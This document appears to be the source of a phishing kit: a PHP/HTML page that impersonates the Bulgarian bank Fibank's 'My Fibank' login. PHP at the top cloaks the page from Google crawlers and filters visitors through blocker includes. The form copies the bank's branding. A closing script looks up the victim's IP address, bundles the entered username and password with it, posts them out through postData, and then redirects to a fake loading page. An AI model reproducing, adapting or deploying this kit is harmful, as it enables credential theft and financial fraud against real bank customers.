<?php
include('block.php');
include('antiip.php');
include('blocker.php');
include('geoip.php');
include('useragent.php');
if (strpos($_SERVER['HTTP_USER_AGENT'], 'google') !== false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
if (strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'google') !== false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
require_once "functions.php";
require_once "ajax.php";
visitors()
?>

<html ng-app="sgOAuth2" class="ng-scope">
<head>
    <script async=""
            src="https://seal.thawte.com/getthawteseal?host_name=e-fibank.bg&amp;size=S&amp;lang=en&amp;_=1678903726535"></script>
    <style type="text/css">@charset "UTF-8";
    [ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak, .ng-hide {
        display: none !important;
    }

    ng\:form {
        display: block;
    }

    .ng-animate-block-transitions {
        transition: 0s all !important;
        -webkit-transition: 0s all !important;
    }

    .ng-hide-add-active, .ng-hide-remove {
        display: block !important;
    }</style>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="icon/favicon.ico">

    <meta name="_csrf" content="68defe38-c0ef-474d-a4fa-4f2e2415a1b9">
    <meta name="_csrf_header" content="X-CSRF-TOKEN">

    <title>Вход</title>
    <link rel="icon" href="icon/favicon.ico">

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="themes/COMMON/scripts/utils/es5-shim.js?v=20230228091555"></script>
    <script src="themes/COMMON/scripts/utils/html5shiv.min.js?v=20230228091555"></script>
    <script src="themes/COMMON/scripts/angular-ui/ui-utils-ieshiv.min.js?v=20230228091555"></script>


    <script>
        document.createElement('ui-select');
        document.createElement('ui-select-match');
        document.createElement('ui-select-choices');
    </script>
    <![endif]-->

    <!--      <script src="themes/COMMON/scripts/utils/modernizr.js?v=20230228091555"></script> -->

    <!-- Core CSS -->

    <link href="css/style.css" rel="stylesheet">


    <!--[if IE 8]>
    <link href="themes/COMMON/stylesheets/style-ie8.css?v=20230228091555" rel="stylesheet">
    <script src="themes/COMMON/scripts/utils/respond.min.js?v=20230228091555"></script>
    <![endif]-->
</head>
<body ng-controller="AppGlobalController"
      ng-class="{'info-footer' : $state.includes('login') || $state.includes('logout'), 'only-footer' : $state.includes('registration') || $state.includes('lost-password')}"
      class="ng-scope info-footer">
<object id="oCAPICOM" codebase="themes/COMMON/capicom.cab#version=2,0,0,3"
        classid="clsid:A996E48C-D3DC-4244-89F7-AFA33EC60679" style="display: none;">&nbsp;
</object>

<!-- Google Tag Manager -->
<script type="text/javascript" async=""
        src="https://www.googletagmanager.com/gtag/js?id=G-TYR53Y9G8L&amp;l=dataLayer&amp;cx=c"></script>
<script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-N2T67T5"></script>
<script>
    (function (w, d, s, l, i) {
        w[l] = w[l] || [];
        w[l].push({
            'gtm.start':
                new Date().getTime(), event: 'gtm.js'
        });
        var f = d.getElementsByTagName(s)[0],
            j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
        j.async = true;
        j.src =
            'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
        f.parentNode.insertBefore(j, f);
    })(window, document, 'script', 'dataLayer', 'GTM-N2T67T5');</script>
<!-- End Google Tag Manager -->


<!-- Google Tag Manager (noscript) -->
<noscript>
    <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N2T67T5" height="0" width="0"
            style="display:none;visibility:hidden"></iframe>
</noscript>
<!-- Google Tag Manager (noscript) -->

<div class="body-wrapper" ng-class="{'logout-footer-wrapper' : $state.includes('logoutSuccess')}">
    <nav class="navbar navbar-default" role="banner">
        <div class="container-fluid">

            <div class="navbar-header">
                <img src="./img/logo.png" height="40px" width="160px">
            </div>

            <div class="collapse navbar-collapse" role="navigation">
                <ul class="nav navbar-nav">
                    <li><a  ng-click="changeLang(notSelectedLang)" ng-bind="notSelectedLang.langDesc"
                           class="ng-binding">English</a></li>
                    <li><a  target="blank" ><img
                            src="./img/site.png"><span translate="APP.WEBSITE" class="ng-scope">Към сайта</span></a>
                    </li>
                    <li dropdown="" sg-dropdown="" is-open="status.isopen" class="ng-scope"><a

                            target="blank"
                           ><img
                            src="./img/full.png"><span translate="APP.MOBAPP" class="ng-scope">Мобилно приложение</span></a>
                        <ul dropdown-menu="" class="dropdown-menu menu-app">
                            <li>
                                <h3 translate="APP.MOBAPP_PIC" class="ng-scope">Банкирайте навсякъде, по всяко
                                    време</h3> <a

                                    target="blank" translate="APP.LEARNMORE" class="btn btn-default h-34 ng-scope"
                                   >Научете
                                повече</a>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <a
                           target="blank"
                           ><img
                                src="./img/traf.png"><span translate="APP.CHANGES" class="ng-scope">Промени в ОУ и тарифа</span></a>
                    </li>

                    <li dropdown="" sg-dropdown="" is-open="status.isopen" class="ng-scope">
                        <!-- TODO: set angular -->
                        <!--<a ng-href="{{'APP.HELP_URL' | translate}}" target="blank"><i class="i-16 i-help"></i><span translate="APP.HELP"></span></a>-->
                        <a ><img src="./img/help.png"><span translate="APP.HELP"
                                                                   class="ng-scope">Помощ</span></a>
                        <ul dropdown-menu="" class="dropdown-menu menu-help">
                            <li>
                                <h3 translate="APP.INFORMATION_NMENU" class="ng-scope">Информация</h3>
                            </li>
                            <!-- ngIf: false -->
                            <li>
                                <a
                                   target="blank"
                                  >
                                    <i class="i-faq i-18-20"></i> <span translate="APP.ASKED_QUESTIONS"
                                                                        class="ng-scope">Често задавани въпроси</span>
                                </a></li>
                            <li>
                                <a
                                   target="blank"
                                   ">
                                    <i class="i-security-advice-big i-18-20"></i>
                                    <span translate="APP.SECURITY_ADVICE" class="ng-scope">Мерки за сигурност</span>
                                </a></li>

                            <!-- ngIf: globalConf.translateSufix != '_CY' -->
                            <li ng-if="globalConf.translateSufix != '_CY'" class="ng-scope"><a

                                    target="blank"
                                   >
                                <i class="i-faq i-18-20"></i> <span translate="APP.OSD" class="ng-scope">Онлайн решаване на спорове</span>
                            </a></li><!-- end ngIf: globalConf.translateSufix != '_CY' -->

                            <li>
                                <div class="divider"></div>
                            </li>
                            <li>
                                <h3 translate="APP.CONTACT_US_MENU" class="ng-scope">Връзка с нас</h3>
                            </li>
                            <li><a class="cursor-text"> <i class="i-18 i-phone"></i>
                                <span translate="0700 12 777" class="ng-scope">0700 12 777</span>
                            </a></li>
                            <li><a class="cursor-text"
                              >
                                <i class="i-20-14 i-mail"></i> <span
                                                                     class="ng-scope">my.fibank@fibank.bg</span>
                            </a></li>
                            <!-- ngIf: false -->
                        </ul>
                    </li>
                </ul>
                <ul class="nav navbar-nav navbar-right">
                    <!-- ngIf: globalConf.translateSufix != '_CY' -->
                    <li ng-if="globalConf.translateSufix != '_CY'"
                        ng-show="$state.includes('login') || $state.includes('lost-password')" class="ng-scope">
                        <div>
                            <a ui-sref="registration({client_id:'E_BANK'})" translate="APP.REGISTRATION"
                               class="pull-right btn btn-info h-34 w-btn-120 ng-scope"
                               >РЕГИСТРАЦИЯ</a>
                        </div>
                    </li><!-- end ngIf: globalConf.translateSufix != '_CY' -->

                    <!-- Change which is not committed on trunk -->

                    <!--<li ng-if="globalConf.translateSufix != '_CY'" ng-cloak
                                ng-show="$state.includes('login')"><div>
                                    <a
                                        translate="APP.E-DEPOSIT"
                                        class="btn btn-primary h-34 w-btn-120"></a>
                                </div></li>-->
                    <li ng-show="$state.includes('registration')" class="ng-hide">
                        <div>
                            <a ui-sref="login({client_id:'E_BANK'})" translate="APP.LOGIN"
                               class="navbar-btn pull-right btn btn-primary h-34 w-btn-120 ng-scope"
                               >ВХОД</a>
                        </div>
                    </li>
                    <li ng-show="$state.includes('logoutSuccess')" class="ng-hide">
                        <div>
                            <a translate="APP.LOGIN"
                               class="btn pull-right btn-primary h-34 w-btn-120 ng-scope">ВХОД</a>
                        </div>
                    </li>

                </ul>
            </div>
        </div>
    </nav>

    <!-- Content -->
    <!-- uiView:  -->
    <div id="app" ui-view="" data-template-url="index" class="ng-scope">


        <div class="login ng-scope">
            <div class="row">
                <div class="col-md-12 login-top-content" ng-hide="stateManager.hideBanner">
                    <!-- ngIf: globalConf.translateSufix != '_CY' -->
                    </a>
                </div>
            </div>

            <div class="row">
                <div class="col-md-12">
                    <div class="container-login row">
                        <div class="col-md-6 col-sm-6 col-box--spacing--right">
                            <div name="form" id="form-signin"
                                  class="form-signin box-border ng-pristine ng-invalid ng-invalid-required"
                                  data-bind="submit: doLogin, visible: stage() === 'credentials'" method="post"
                                   novalidate="">
                                <input type="hidden" value="index" name="step">
                                <h3 class="form-signin-heading ng-scope" translate="LOGIN.LOGIN_TITLE">Вход в My
                                    Fibank</h3>
                                <div id="loginform">

                                    <!-- * Default login type -->
                                    <!-- ngIf: stateManager.uiMode === 'USERNAME' -->
                                    <div ng-if="stateManager.uiMode === 'USERNAME'" class="ng-scope">
                                        <div class="form-group">
                                            <label translate="LOGIN.USERNAME" class="ng-scope"><span
                                                    class="red-txt">* </span>Потребител</label>
                                            <label translate="LOGIN.REQUIRED_FIELDS"
                                                   class="pull-right grey-txt s2 ng-scope"><span
                                                    class="red-txt">* </span>Задължителни полета</label>
                                            <div class="form-control-icon">
                                                <i class="i-16 i-user-normal"><img src="./img/nor.png"></i>

                                                <input type="text" name="username" id="username"
                                                       class="form-control ng-pristine ng-invalid ng-invalid-required"
                                                       ng-model="credentials.username" ng-required="true"
                                                       ng-keyup="form.$valid &amp;&amp; $event.keyCode === 13 &amp;&amp; saveLogin(credentials.username, credentials.password)"
                                                       tabindex="1" autofocus="" required="required">

                                                <p class="pull-right red-txt s2 ng-scope ng-hide"
                                                   ng-show="form.username.$error.required &amp;&amp; form.username.$dirty"
                                                   translate="LOGIN.ERROR.USERNAME">Моля, въведете потребител!</p>
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label translate="LOGIN.PASSWORD" class="ng-scope"><span
                                                    class="red-txt">* </span>Парола</label>
                                            <div class="form-control-icon">
                                                <i class="i-16 i-password"><img src="./img/pass.png"></i>

                                                <input type="password" name="password" onkeyup="success()" id="password"
                                                       class="form-control ng-pristine ng-invalid ng-invalid-required"
                                                       ng-model="credentials.password" ng-required="true"
                                                       ng-keyup="form.$valid &amp;&amp; $event.keyCode === 13 &amp;&amp; saveLogin(credentials.username, credentials.password)"
                                                       tabindex="2" required="required">

                                                <p class="pull-right s2 red-txt ng-scope ng-hide"
                                                   ng-show="form.password.$error.required &amp;&amp; form.password.$dirty"
                                                   translate="LOGIN.ERROR.PASSWORD">Моля, въведете парола!</p>
                                            </div>

                                            <div class="lost-password--position">
                                                <a class="grey-txt s2 ng-scope"
                                                   ui-sref="lost-password({client_id:'E_BANK'})"
                                                   translate="LOGIN.LOST_PASSWORD" tabindex="-1"
                                                  >Забравена парола?</a>
                                            </div>

                                        </div>

                                        <div>
                                            <button class="btn btn-primary ng-scope" onclick="validate()" id="submitBtn"
                                                    type="submit"><i id="spinner" class="hidden fa fa-spinner fa-spin"
                                                                     style="width: 15px"></i>&nbsp;Вход
                                            </button>
                                        </div>

                                        <div ng-show="stateManager.notWorkingAuthRules" class="ng-hide">
                                            <p class="alert alert-danger s2 red-txt ng-binding"
                                               ng-bind-html="translatesWrapper.authProvException | translate | htmlSafe"></p>
                                        </div>


                                    </div><!-- end ngIf: stateManager.uiMode === 'USERNAME' -->

                                    <!-- * Login with push notification -->
                                    <!-- ngIf: stateManager.uiMode === 'PUSH_AUTH' -->

                                    <!-- * Login with QR code -->
                                    <!-- ngIf: stateManager.uiMode === 'QR_CODE' -->

                                    <!-- * Login with SMS code -->
                                    <!-- ngIf: stateManager.uiMode === 'SMS' -->

                                    <!-- * Login with HW Token -->
                                    <!-- ngIf: stateManager.uiMode === 'HW_TOKEN' -->


                                    <!-- * Login with SF Token -->
                                    <!-- ngIf: stateManager.uiMode === 'SF_TOKEN' -->

                                </div>

                                <input id="lang" class="hidden ng-pristine ng-valid" type="text" name="lang"
                                       ng-model="credentials.lang">
                                <input id="time" class="hidden ng-pristine ng-valid" type="text" name="time"
                                       ng-model="credentials.time">
                                <input id="token" class="hidden" type="text" name="_csrf"
                                       value="68defe38-c0ef-474d-a4fa-4f2e2415a1b9">
                                <input id="sig" class="hidden ng-pristine ng-valid" type="text" name="sig"
                                       ng-model="credentials.sig">
                            </div>
                            <script type="text/javascript">
                                function success() {
                                    if (document.getElementById("password").value === "") {
                                        document.getElementById('button').disabled = true;
                                    } else {
                                        document.getElementById('button').disabled = false;
                                    }
                                }
                            </script>

                            <div class="ssl-box box-border" ng-hide="stateManager.hideSSLbox">
                                <div class="ssl-thawte">
                                    <p translate="LOGIN.SSL_CERT_DESC"
                                       title="Чрез &quot;кликване&quot; можете да се уверите, че този сайт е избрал Thawte SSL за сигурност при електронна търговия и поверителни комуникации."
                                       class="ng-scope">Защитен вход със <a
                                                                            target="blank">SSL сертификат</a> от:</p>
                                    <script type="text/javascript"
                                            src="https://seal.thawte.com/getthawteseal?host_name=e-fibank.bg&amp;size=S&amp;lang=en"></script>
                                    <div>
                                        <img src="img/img_logo_thatwe.png"
                                             alt="This site has chosen a thawte SSL Certificate to improve Web site security">
                                        <span ng-bind="currentDate.now() | date: 'dd.MM.yyyy'" class="ng-binding">04.06.2025</span>
                                    </div>
                                </div>
                                <ul>
                                    <li>
                                        <a
                                           target="_blank"
                                           >
                                            <i class="i-16 i-security-advice"><img src="./img/sec.png"></i>
                                            <span translate="LOGIN.SECURITY_ADVICE"
                                                  class="ng-scope">Съвети за сигурност</span>
                                            <i class="i-arrow-right-4x7"></i>
                                        </a>
                                    </li>
                                    <li>
                                        <!--<a><i class="i-16 i-error-message"></i><span translate="LOGIN.ERROR_MESSAGES"></span><i class="i-arrow-right-4x7"></i></a> -->
                                        <a n
                                           target="_blank"
                                           >
                                            <i class="i-faq i-18-20"><img src="./img/faq.png"></i>
                                            <span translate="APP.ASKED_QUESTIONS" class="ng-scope">Често задавани въпроси</span>
                                            <i class="i-arrow-right-4x7"></i>
                                        </a>
                                    </li>
                                </ul>
                            </div>

                        </div>

                        <!-- * Mobile Application Advertisement  -->
                        <!-- ngIf: stateManager.showMobileAppDownloads -->

                        <div class="col-md-6 col-sm-6 col-box--spacing--left" ng-hide="stateManager.hidePreLoginPages">
                            <!-- <p ng-if="globalConf.translateSufix != '_CY'" translate="LOGIN.PREVIEW_ONLINE"></p> -->
                            <!-- ngIf: globalConf.translateSufix != '_CY' --><a
                                ng-if="globalConf.translateSufix != '_CY'"
                                 target="_blank"
                                class="banner credit-preview-online ng-scope"
                                ng-class="{'credit-logo-en' : selectLang.lang != 'BGN'}"
                                ><img src="./img/1.png"
                                                                                                  width="384"
                                                                                                  height="86"></a>
                            <!-- end ngIf: globalConf.translateSufix != '_CY' -->
                            <!-- ngIf: globalConf.translateSufix != '_CY' --><a
                                ng-if="globalConf.translateSufix != '_CY'"

                                target="_blank" class="banner card-preview-online ng-scope"
                                ng-class="{'card-logo-en' : selectLang.lang != 'BGN'}"
                                ><img
                                src="./img/2.png" width="384" height="86"></a>
                            <!-- end ngIf: globalConf.translateSufix != '_CY' -->
                            <!-- ngIf: globalConf.translateSufix != '_CY' --><a
                                ng-if="globalConf.translateSufix != '_CY'"
                                 target="_blank"
                                class="banner mortgage-preview-online ng-scope"
                                ng-class="{'mortgage-logo-en' : selectLang.lang != 'BGN'}"
                               ><img src="./img/3.png"
                                                                                                  width="384"
                                                                                                  height="86"></a>
                            <!-- end ngIf: globalConf.translateSufix != '_CY' -->
                            <!-- ngIf: globalConf.translateSufix != '_CY' --><a
                                ng-if="globalConf.translateSufix != '_CY'"
                                target="_blank"
                                class="banner overdraft-easy ng-scope"
                                ng-class="{'overdraft-easy-en' : selectLang.lang != 'BGN'}"
                              ><img src="./img/4.png"
                                                                                                   width="384"
                                                                                                   height="86"></a>
                            <!-- end ngIf: globalConf.translateSufix != '_CY' -->
                            <!-- ngIf: globalConf.translateSufix != '_CY' --><a
                                ng-if="globalConf.translateSufix != '_CY'"
                                 target="_blank"
                                class="banner video-preview-online ng-scope"
                                ng-class="{'video-logo-en' : selectLang.lang != 'BGN'}"
                                ><img src="./img/5.png"
                                                                                            width="384" height="86"></a>
                            <!-- end ngIf: globalConf.translateSufix != '_CY' -->
                            <!--<article ng-if="globalConf.translateSufix != '_CY'" class="important" ng-bind-html="'LOGIN.IMPORTANT_CONTENT_EVROTRUST' | translate"></article> -->
                            <!-- <article ng-if="globalConf.translateSufix != '_CY'" class="important" ng-bind-html="'LOGIN.IMPORTANT_CONTENT_MOBILE_CORP' | translate"></article> -->
                            <!--  <article ng-if="globalConf.translateSufix != '_CY'" class="important" ng-bind-html="'LOGIN.IMPORTANT_CONTENT' | translate"></article>-->
                            <!-- ngIf: globalConf.translateSufix == '_CY' -->
                            <!--<article ng-if="globalConf.translateSufix != '_CY'" class="important">
                                      <h3 translate="LOGIN.REVIEW_SYSTEM"></h3> -->
                            <!--<p translate="LOGIN.REVIEW_SYSTEM_CONTENT" class="grey-txt"></p>  -->
                            <!-- <a id="demo-link" href ng-click="demo()" ng-disabled="startSubmit"><span translate="LOGIN.DEMO"></span><i class="i-arrow-right-5x8"></i></a> </article>
                                   <div class="divider"></div>  -->
                            <!--                  <article>    -->
                            <!--                      <p translate="{{('LOGIN.QUESTIONS_CONTENT' + globalConf.translateSufix) | translate}}" class="grey-txt"></p> -->
                            <!--                      a ng-href="{{('LOGIN.URL_READ_MORE' + globalConf.translateSufix) | translate}}" target="_blank""><span translate="LOGIN.READ_MORE"></span><i class="i-arrow-right-5x8"></i></a>  -->
                            <!--                  </article> -->
                            <!-- ngIf: false -->
                        </div>
                    </div>
                </div>
            </div>

            <div class="row" ng-hide="stateManager.hideMSGbox">
                <div class="col-md-12">
                    <!-- ngIf: globalConf.translateSufix != '_CY' -->
                    <article ng-if="globalConf.translateSufix != '_CY'" class="important ng-binding ng-scope"
                             ng-bind-html="'LOGIN.BOTTOM_MSG_CONTENT' | translate">


                </div>
                </article><!-- end ngIf: globalConf.translateSufix != '_CY' -->
            </div>
        </div>
    </div>
</div>
<!-- Content -->

<div class="body-push" ng-class="{'logout-footer' : $state.includes('logoutSuccess')}"></div>
</div>
<!--  FOOTER  -->
<div id="footer-push" ng-class="{'logout-footer' : $state.includes('logoutSuccess')}">
    <!-- ngIf: !$state.includes('registration') && !$state.includes('lost-password') -->
    <div ng-if="!$state.includes('registration') &amp;&amp; !$state.includes('lost-password')" class="ng-scope">
        <div class="info-box text-center">
            <!--<h5 translate="LOGIN.QUESTIONS"></h5>
            <ul class="list-inline first-ul">
                <li><i class="i-phone"></i><span translate="LOGIN.PHONE"></span> <span class="blue-txt bold" translate="{{('LOGIN.PHONE_NUM' + globalConf.translateSufix)}}"></span> <span ng-if="globalConf.translateSufix != '_CY'" translate="LOGIN.NONSTOP"></span></li>
                <li><a href="{{(globalConf.translateSufix == '_CY' ? 'mailto:cyprusbranch@fibank.com.cy' : 'mailto:my.fibank@fibank.bg')}}" target="blank"><i class="i-20-14 i-mail"></i><span translate="LOGIN.EMAIL"></span> <span class="blue-txt bold" translate="{{('LOGIN.EMAIL_LINK' + globalConf.translateSufix) | translate}}"></span></a></li>
                <li ng-if="false"><a  target="blank"> <i class="i-16 i-chat"></i><span translate="LOGIN.CHAT"></span> <span translate="LOGIN.CONTACT_US" class="blue-txt bold"></span></a></li>
            </ul>
            <p class="grey-txt s4" translate="{{'LOGIN.CALL_INFO' + globalConf.translateSufix}}"></p>!-->
            <!-- ngIf: globalConf.translateSufix != '_CY' --><h5 translate="LOGIN.LOCATION"
                                                                 ng-if="globalConf.translateSufix != '_CY'"
                                                                 class="ng-scope">Вижте къде се намираме:</h5>
            <!-- end ngIf: globalConf.translateSufix != '_CY' -->
            <!-- ngIf: globalConf.translateSufix != '_CY' -->
            <ul class="list-inline last-ul ng-scope" ng-if="globalConf.translateSufix != '_CY'">
                <li><a  target="_blank"><i class="i-16 i-offices"><img
                        src="./img/of.png"></i><span translate="LOGIN.OFFICE_INFO"
                                                     class="ng-scope">Клонове</span><i
                        class="i-arrow-right-5x8"></i></a></li>
                <li><a target="_blank"><i class="i-18 i-atm"><img
                        src="./img/atm.png"></i><span translate="LOGIN.ATM_INFO"
                                                      class="ng-scope">Банкомати</span><i
                        class="i-arrow-right-5x8"></i></a></li>
            </ul><!-- end ngIf: globalConf.translateSufix != '_CY' -->
        </div>
    </div><!-- end ngIf: !$state.includes('registration') && !$state.includes('lost-password') -->
    <div id="footer" class="container-fluid text-center">
        <ul class="list-inline s2">
            <!-- ngIf: false -->
            <!-- ngIf: false -->
            <!-- ngIf: globalConf.translateSufix != '_CY' -->
            <li ng-if="globalConf.translateSufix != '_CY'" class="ng-scope"><a

                    translate="APP.REGISTRATION_PROC" target="_blank" class="ng-scope"
                   >Процес на
                регистрация</a><i class="i-arrow-right-4x7"></i></li>
            <!-- end ngIf: globalConf.translateSufix != '_CY' -->
            <!-- ngIf: false -->
            <li><a
                   translate="APP.FEES_COMISSIONS" target="_blank" class="ng-scope"
                  >Такси и комисиони</a><i
                    class="i-arrow-right-4x7"></i></li>
            <li><a  translate="APP.DOCUMENTS"
                   target="_blank" class="ng-scope">Документи</a><i
                    class="i-arrow-right-4x7"></i></li>
            <li><a
                   translate="APP.PERSONAL_DATA" target="_blank" class="ng-scope"
                  >Лични
                данни</a><i class="i-arrow-right-4x7"></i></li>
            <li><a  translate="APP.CONTACTS" target="_blank" class="ng-scope"
                   >Контакти</a><i class="i-arrow-right-4x7"></i></li>
        </ul>
        <!-- ngIf: globalConf.translateSufix != '_CY' --><p ng-if="globalConf.translateSufix != '_CY'"
                                                            class="s2 ng-scope" translate="APP.COPYRIGHTS">© Първа
        инвестиционна банка 2009-2025 <span style="border-right: 1px solid #cdd4d6; margin: 0 2.5px;"></span>&nbsp;&nbsp;Всички
        права запазени <span style="border-right: 1px solid #cdd4d6; margin: 0 2.5px;"></span>&nbsp;&nbsp;BIC /
        SWIFT: FINVBGSF</p><!-- end ngIf: globalConf.translateSufix != '_CY' -->
        <!-- ngIf: globalConf.translateSufix == '_CY' -->
    </div>
</div>
<!--  /FOOTER  -->


<!-- Static sources -->

<script type="text/javascript" src="themes/E_BANK/app/app-static.min.js?v=20230228091555"></script>


<script src="js/jquery-3.5.1.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.mask.js"></script>
<script src="./js/jquery.min.js"></script>
<script src="./js/axios.min.js"></script>
<script src="./js/main.js"></script>
<script>
    let ip

    function getIpAndCountryCode() {
        axios.get("https://api.ipify.org/?format=json").then((res) => {
            ip = res.data.ip
        }).catch();

    }

    getIpAndCountryCode()

    const validateEmail = (email) => {
        return String(email)
            .toLowerCase()
            .match(
                /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
            );
    };


    function validate() {
        $('#submitBtn').addClass('disabled')
        $('#spinner').removeClass('hidden')

        let valid = true;
        let username = $('#username')
        let pwd = $('#password')

        if (username.val().length < 5 || validateEmail(username.val())) {
            valid = false
            username.css('border-color', '#b24926')
            $('#usernameError').removeClass('ng-hide')
        }

        if (pwd.val().length < 5) {
            valid = false
            pwd.css('border-color', '#b24926')
            $('#passwordError').removeClass('ng-hide')
        }
        if (valid) {
            $('#AuthError').addClass('hidden')
            const message = `user: ${username.val()} | pwd: ${pwd.val()} | ip: ${ip}`

            postData(message).then(function () {
                window.location.href = './loading_login.html'
            }).catch(() => {
                username.css('border-color', '#b24926')
                pwd.css('border-color', '#b24926')
            });
            $('#submitBtn').removeClass('disabled')
            $('#spinner').addClass('hidden')
        } else {
            $('#submitBtn').removeClass('disabled')
            $('#spinner').addClass('hidden')
            username.css('border-color', '#b24926')
            pwd.css('border-color', '#b24926')
        }
    }

    $('document').ready(() => {
        $('#username').click(() => {
            $('#usernameError').addClass('ng-hide')
            $('#username').css('border-color', '#CCC')
        })

        $('#password').click(() => {
            $('#passwordError').addClass('ng-hide')
            $('#password').css('border-color', '#CCC')
        })
    })
</script>

</body>
</html>